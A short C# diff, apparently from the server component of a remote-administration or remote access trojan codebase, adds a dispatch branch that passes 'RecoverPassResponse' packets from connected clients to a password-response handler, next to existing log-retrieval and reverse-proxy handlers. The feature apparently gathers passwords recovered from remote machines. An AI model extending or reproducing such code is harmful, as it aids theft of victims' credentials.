@@ -70,6 +70,10 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleGetLogsResponse(client, (ClientPackets.GetLogsResponse)packet);
             }
+            else if (type == typeof(Core.Packets.ClientPackets.RecoverPassResponse))
+            {
+                CommandHandler.HandlePasswordResponse(client, (Core.Packets.ClientPackets.RecoverPassResponse)packet);
+            }
             else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyData) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
